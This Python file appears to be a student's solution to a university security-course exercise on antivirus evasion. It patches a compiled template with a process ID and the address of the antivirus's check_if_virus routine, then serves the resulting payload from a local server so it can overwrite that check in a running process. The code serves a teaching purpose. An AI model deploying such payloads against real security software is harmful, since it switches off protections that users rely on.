import addresses
import evasion

from infosec.core import assemble


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the check_if_virus code.

        Notes:
        1. You can assume we already compiled q2.c into q2.template.
        2. Use addresses.CHECK_IF_VIRUS_CODE (and addresses.address_to_bytes).
        3. If needed, you can use infosec.core.assemble.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q2.template'
        
        with open(PATH_TO_TEMPLATE, 'rb') as template:
            template_bin = bytearray(template.read())
            
            pid_idx = template_bin.find(addresses.address_to_bytes(0x1234567a))
            address_idx = template_bin.find(addresses.address_to_bytes(0x1234567b))
            
            template_bin[pid_idx:pid_idx+4] = pid.to_bytes(4, byteorder='little')
            template_bin[address_idx:address_idx+4] =  addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_CODE)

            return bytes(template_bin)

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
